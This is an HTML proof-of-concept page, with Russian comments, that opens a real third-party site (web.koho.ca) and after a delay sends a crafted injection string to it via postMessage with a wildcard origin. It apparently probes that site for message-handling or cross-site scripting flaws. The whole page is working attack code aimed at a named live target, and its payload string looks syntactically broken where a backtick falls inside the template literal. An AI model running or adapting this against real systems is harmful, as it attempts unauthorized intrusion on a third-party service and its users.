<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC for postMessage Injection</title>
</head>
<body>
    <h1>PoC for postMessage Injection</h1>
    <button id="pocButton">Send Malicious Payload</button>

    <script>
        function sendMaliciousPayload() {
            // Открыть окно с целевым сайтом
            var win = window.open('https://web.koho.ca/.well-known/apple-developer-merchantid-domain-association/');

            // Вредоносное сообщение, которое мы пытаемся внедрить
            var payload = `{ "key": "tk1qujtb98%2527%2522`'\"/tk1qujtb98/><tk1qujtb98/\>b823t7k8hj&" }`;

            // Отправить сообщение в открытое окно
            setTimeout(function() {
                win.postMessage(payload, '*');
            }, 5000);
        }

        document.getElementById('pocButton').addEventListener('click', sendMaliciousPayload);
    </script>
</body>
</html>
